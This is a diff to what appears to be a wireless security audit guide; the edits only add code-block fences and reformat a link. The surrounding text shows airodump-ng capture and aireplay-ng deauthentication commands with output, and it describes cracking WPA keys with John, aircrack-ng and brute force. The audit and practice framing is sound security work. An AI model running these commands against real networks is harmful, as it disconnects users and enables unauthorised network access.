@@ -17,6 +17,7 @@ $ sudo airodump-ng -c 1 --bssid 1A:2B:3C:4D:5E:6F -w sampleorg_airodump mon0
  1A:2B:3C:4D:5E:6F  AB:CD:EF:AB:CD:EF    0    1e- 1      0     1234
  1A:2B:3C:4D:5E:6F  AA:BB:CC:DD:EE:FF  -76    0e- 1      0     1122
  1A:2B:3C:4D:5E:6F  A1:B2:C3:D4:E5:F6  -80    0e- 1      0     4321
+```
 
 wifite is also useful for this step, and claims to automatically de-auth (step 3).
 
@@ -24,6 +25,7 @@ wifite is also useful for this step, and claims to automatically de-auth (step 3
 
 In the example below, AB:CD:EF:AB:CD:EF is the MAC address of a laptop that was briefly disconnected in this way.
 
+```
 $ aireplay-ng -0 1 -a 1A:2B:3C:4D:5E:6F -c AB:CD:EF:AB:CD:EF mon0 
 
  15:54:48  Waiting for beacon frame (BSSID: 1A:2B:3C:4D:5E:6F) on channel -1
@@ -59,10 +61,9 @@ For WPA captures, John can either feed in to an aircrack process or attach a cap
 As a last resort, you can try a direct brute force attack overnight or post-audit to fill in details on key strength.
 
 
-
 ### Sample Practice ###
 
-For practice on any of these methods, you can use the wpa-Induction.pcap file from http://wiki.wireshark.org/SampleCaptures .
+For practice on any of these methods, you can use the wpa-Induction.pcap file from [Wireshark](http://wiki.wireshark.org/SampleCaptures).
 
 Successful password cracking via piping these into aircrack-ng:
 
